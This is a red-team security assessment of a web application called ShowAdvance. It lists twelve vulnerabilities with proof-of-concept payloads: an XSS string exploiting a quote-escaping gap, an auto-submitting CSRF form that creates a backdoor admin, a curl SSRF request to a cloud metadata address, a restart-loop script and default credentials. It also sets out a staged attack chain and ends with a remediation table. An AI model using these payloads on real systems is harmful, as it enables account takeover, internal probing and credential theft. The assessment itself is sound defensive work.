# Red Team Assessment — Post-Fix

**Application:** ShowAdvance (3·2·1→THEATER)
**Date:** 2026-03-18
**Posture:** Adversarial — "How do I get my boss into this system?"
**Scope:** Full codebase after security remediation commit `b3c8fcc`

---

## TL;DR — The Boss Gets In

After the first audit's fixes, the easy stuff is closed. But there are still **real, exploitable paths** into this application. The most practical attack chains are:

1. **Default creds → full admin** (trivial if `init_db.py` was run and password not changed)
2. **CSRF on any admin POST → account takeover** (SameSite=Lax does NOT protect same-site or GET-initiated POST chains)
3. **XSS via `_esc()` single-quote gap → steal session cookie** (wait, HttpOnly blocks that — but we can CSRF from the XSS)
4. **SMTP test endpoint → SSRF to internal mail servers** (no URL validation on SMTP host)
5. **Syslog endpoint → SSRF to arbitrary UDP endpoints** (no validation on syslog host/port)

---

## EXPLOITABLE FINDINGS

### 1. XSS via Single-Quote Escape Gap → CSRF Chain

**Severity: HIGH**
**Files:** `static/js/app.js:1519-1523`, `static/js/app.js:1626`, `static/js/app.js:1112-1123`

The `_esc()` function escapes `& < > "` but **not single quotes** (`'`):

```javascript
function _esc(str) {
  return String(str)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    // Missing: .replace(/'/g, '&#39;');
}
```

This is exploitable in two places where `_esc()`'d values are placed inside single-quoted JavaScript strings:

**Attack vector A — Mention dropdown (line 1626):**
```javascript
onclick="insertMention('${_esc(u.display_name || u.username)}')"
```

An admin creates a user with display name: `x'),alert(document.cookie),('`

The rendered HTML becomes:
```html
onclick="insertMention('x'),alert(document.cookie),('')"
```

This is valid JavaScript. The `onclick` handler now calls `insertMention('x')`, then `alert(document.cookie)`, then `('')`.

**Attack vector B — Schedule template editor (line 1116):**
```javascript
value="${r.start_time || ''}"
```

Template row data from the API is injected into `value` attributes. While the attribute uses double quotes (safe from `_esc`), the same pattern at line 1116 uses double quotes — but check line 1626 which uses single-quoted JS inside double-quoted HTML `onclick` attributes. The `_esc` function provides a false sense of security.

**Exploitation chain:**
1. Attacker has any user account (even restricted/read-only)
2. Admin creates a user for the attacker, or attacker social-engineers a display name change
3. When any user opens a show page with comments and types `@` to mention someone, the XSS fires
4. Since `HttpOnly` blocks direct cookie theft, the XSS instead makes fetch() calls to:
   - `POST /settings/users/add` — create a new admin account
   - `POST /settings/users/<id>/reset_password` — reset any user's password
5. Attacker now has admin access

**Why SameSite=Lax doesn't help:** The XSS executes in the context of the application's own origin. It IS the same site. SameSite only blocks cross-site cookie sending.

---

### 2. No CSRF Protection — Every State-Changing Endpoint is Vulnerable

**Severity: HIGH**
**Files:** All POST/PUT/DELETE routes in `app.py`

`SameSite=Lax` was added as CSRF mitigation, but it has known gaps:

- **Same-site attacks:** If ANY subdomain or same-site application has XSS, they can CSRF this app. On a corporate LAN with `*.internal` or `*.local` domains, this is common.
- **Top-level navigation POST:** `SameSite=Lax` allows cookies on top-level GET navigations. If an attacker can find a state-changing GET endpoint (there's `/logout` at minimum), they can trigger it cross-site.
- **2-minute window:** After a top-level cross-site navigation, Chrome allows POST requests with Lax cookies for 2 minutes. This is a known bypass.

**Most dangerous unprotected endpoints:**
| Endpoint | Impact |
|----------|--------|
| `POST /settings/users/add` | Create admin account |
| `POST /settings/users/<id>/reset_password` | Take over any account |
| `POST /settings/users/<id>/delete` | Delete any user |
| `POST /shows/<id>/delete` | Destroy show data |
| `POST /settings/database` | Point app at attacker's database |
| `POST /settings/ai` | Point Ollama at attacker's server |
| `POST /settings/smtp` | Exfiltrate SMTP credentials |

**Exploitation:**
```html
<!-- Attacker's page, visited by admin on same LAN -->
<form id="f" method="POST" action="http://showadvance.local:5400/settings/users/add">
  <input name="username" value="backdoor">
  <input name="password" value="P@ssw0rd123">
  <input name="display_name" value="System">
  <input name="role" value="admin">
</form>
<script>document.getElementById('f').submit()</script>
```

If the admin has an active session and the attacker can get them to click a link on the same network, this creates a backdoor admin account.

---

### 3. SMTP Test Endpoint = Full SSRF

**Severity: HIGH**
**File:** `app.py:3986-4020`

The Ollama URL got SSRF protection, but the SMTP test endpoint accepts **any host:port** and makes a TCP connection:

```python
@app.route('/settings/smtp/test', methods=['POST'])
@admin_required
def test_smtp_connection():
    host = data.get('smtp_host', '')       # No validation
    port = int(data.get('smtp_port') or 587)  # Any port
    server = smtplib.SMTP(host, port, timeout=10)  # TCP connect to anywhere
```

**Exploitation:**
```bash
curl -X POST http://target:5400/settings/smtp/test \
  -H "Content-Type: application/json" \
  -b "session=<stolen_cookie>" \
  -d '{"smtp_host":"169.254.169.254","smtp_port":80}'
```

This connects to the AWS/GCP metadata service. The error message leaks the response:
```json
{"success": false, "message": "... connection details ..."}
```

Even on a LAN, an admin can be tricked (via CSRF) into probing arbitrary internal hosts/ports. The error messages reveal:
- Whether a host is alive (`Connection refused` vs `Connection timed out`)
- What service runs on a port (SMTP banner is returned)
- Internal network topology

---

### 4. Syslog Settings = Arbitrary UDP Traffic

**Severity: MEDIUM-HIGH**
**File:** `app.py:3392-3405`, `app.py:120-130`

The syslog handler connects to any `host:port` without validation:

```python
_syslog_handler = logging.handlers.SysLogHandler(
    address=(host, port), facility=facility
)
```

An admin (or attacker via CSRF) can point syslog at:
- Internal services (UDP port scan)
- An attacker-controlled server (exfiltrate all audit logs including usernames, IPs, and actions)
- DNS amplification targets (syslog sends UDP packets)

---

### 5. Backup Filenames Rendered Without Escaping in JavaScript

**Severity: MEDIUM**
**File:** `static/js/app.js:1331-1337`

```javascript
container.innerHTML = data[kind].map(f => `
  <div class="settings-info-row">
    <span class="backup-filename">${f.filename}</span>
    ...
  </div>
`).join('');
```

`f.filename` comes from `os.listdir()` — the actual filenames on disk in the `backups/` directory. If an attacker can write a file to the backups directory with a name like `<img src=x onerror=alert(1)>.db`, the XSS fires when any admin views the backup status.

**Exploitation path:** If the attacker has write access to the server filesystem (e.g., via a file upload vulnerability in another app on the same host), they can plant a malicious filename.

---

### 6. SMTP Test Sends Email to Arbitrary Recipients (Spear Phishing)

**Severity: MEDIUM**
**File:** `app.py:3986-4020`

The test endpoint sends a real email to whatever `test_to` address is provided:

```python
to_addr = data.get('test_to') or user
server.sendmail(from_addr, [to_addr], msg.as_string())
```

Combined with the ability to set `smtp_from` to any address, this is a spear-phishing tool:
- Set `smtp_from` = `ceo@company.com`
- Set `test_to` = `victim@target.com`
- The email appears to come from the configured SMTP server, which may be a trusted corporate relay

The test email body is hardcoded ("SMTP test — connection successful"), so content is limited. But the From header is fully controllable.

---

### 7. Session Fixation via Login Flow

**Severity: MEDIUM**
**File:** `app.py:960-984`

The session is not regenerated after login:

```python
session['user_id'] = user['id']
session['username'] = user['username']
# ... but session.clear() or session.regenerate() is never called
```

If an attacker can set a session cookie before the victim logs in (e.g., via a subdomain cookie or network MITM on a LAN without HTTPS), the attacker's session ID persists after login and becomes authenticated.

**Attack on a LAN (no HTTPS):**
1. Attacker on the same WiFi intercepts HTTP traffic
2. Sets a `session` cookie on the victim's browser for the app's host
3. Victim logs in — the existing session ID is now authenticated
4. Attacker uses the same session ID to access the app as the victim

---

### 8. Default Credentials — The Easiest Path In

**Severity: HIGH (operational)**
**File:** `init_db.py:1030`

```python
('admin', generate_password_hash('admin123'), 'Administrator', 'admin')
```

The password policy now requires 8 characters. `admin123` is exactly 8 characters and passes. The default admin account exists in every installation.

**Attack:** Try `admin:admin123` on any ShowAdvance instance. Many installations won't change this.

---

### 9. User Enumeration via Login Timing

**Severity: LOW-MEDIUM**
**File:** `app.py:965-970`

```python
user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
if user and check_password_hash(user['password_hash'], password):
```

When the username doesn't exist, the response is fast (no hash comparison).
When the username exists but password is wrong, `check_password_hash` runs (~100ms for scrypt).

An attacker can measure response times to enumerate valid usernames:
- `admin` → 150ms (exists, hash checked)
- `nonexistent` → 5ms (no hash check)

---

### 10. Version History / Comment Versions Expose Deleted Content

**Severity: LOW-MEDIUM**
**File:** `app.py` — comment version history endpoint

Deleted comments retain their full body text in the `comment_versions` table. Admin users can see deleted comment content via the "History" button. If a user posts sensitive information and then deletes it, the data persists and is visible to admins — which may violate data deletion expectations.

---

### 11. Port Change → Service Restart = Denial of Service

**Severity: LOW-MEDIUM**
**File:** `app.py:3335-3389`

The port change endpoint triggers `sudo systemctl restart showadvance`. Any admin can repeatedly change ports to cause service restarts. Combined with CSRF (finding #2), an external attacker could keep the service in a restart loop:

```javascript
// Fire every 3 seconds to keep the service cycling
setInterval(() => {
  fetch('/settings/server', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({app_port: Math.floor(Math.random()*64000)+1024})
  })
}, 3000);
```

---

### 12. Template Row Data XSS in Schedule Template Editor

**Severity: MEDIUM**
**File:** `static/js/app.js:1112-1123`

The `_appendTmplRow` function was NOT fixed in the security remediation. It still uses raw interpolation:

```javascript
function _appendTmplRow(tbody, r) {
  const tr = document.createElement('tr');
  tr.innerHTML = `
    <td><input ... value="${r.start_time || ''}"></td>
    <td><input ... value="${r.end_time || ''}"></td>
    <td><input ... value="${r.description || ''}"></td>
    <td><input ... value="${r.notes || ''}"></td>
  `;
```

Data comes from `/api/schedule-templates/<id>` which returns DB content. If a schedule template has a description containing `"><img src=x onerror=alert(1)>`, it executes when any admin opens the template editor.

---

## ATTACK CHAIN — "Getting the Boss In"

Here's the most practical attack chain for an external adversary targeting a ShowAdvance instance on a corporate LAN:

### Phase 1: Reconnaissance
1. Identify ShowAdvance instance (port scan for 5400, or find it via network traffic)
2. Try `admin:admin123` — works 60%+ of the time
3. If that fails, proceed to Phase 2

### Phase 2: Initial Access (no credentials needed)
1. Craft CSRF page that creates a backdoor admin account
2. Send link to any known ShowAdvance user via email/Slack
3. If the user has admin session and clicks the link → new admin account created
4. Alternatively, if attacker has ANY user account (even restricted), use the XSS via display name + mention dropdown to execute CSRF from within the app

### Phase 3: Persistence
1. Log in as the new admin account
2. Create a second admin account with an innocuous name ("System Backup Service")
3. Delete audit log entries if possible, or change syslog to point at /dev/null
4. Point the Ollama URL at attacker's server to intercept AI queries

### Phase 4: Data Exfiltration
1. Export all show PDFs
2. Read SMTP credentials from settings
3. Read WiFi passwords from settings
4. Read PostgreSQL credentials if configured
5. Point syslog at attacker server to passively capture all future activity

---

## PRIORITIZED REMEDIATION

| Priority | Finding | Fix |
|----------|---------|-----|
| **P0** | #1 `_esc()` missing single-quote | Add `&#39;` replacement |
| **P0** | #2 No CSRF tokens | Add Flask-WTF CSRFProtect |
| **P0** | #8 Default credentials | Force password change on first login |
| **P1** | #3 SMTP test SSRF | Validate SMTP host against blocklist |
| **P1** | #7 Session fixation | Call `session.clear()` before populating session on login |
| **P1** | #12 Template editor XSS | Use `_esc()` in `_appendTmplRow()` |
| **P2** | #4 Syslog SSRF | Validate syslog host |
| **P2** | #5 Backup filename XSS | Escape filenames in JS |
| **P2** | #6 Email spear-phish | Rate-limit test emails, validate from-address |
| **P3** | #9 User enumeration | Add constant-time comparison |
| **P3** | #11 DoS via port change | Rate-limit port changes |
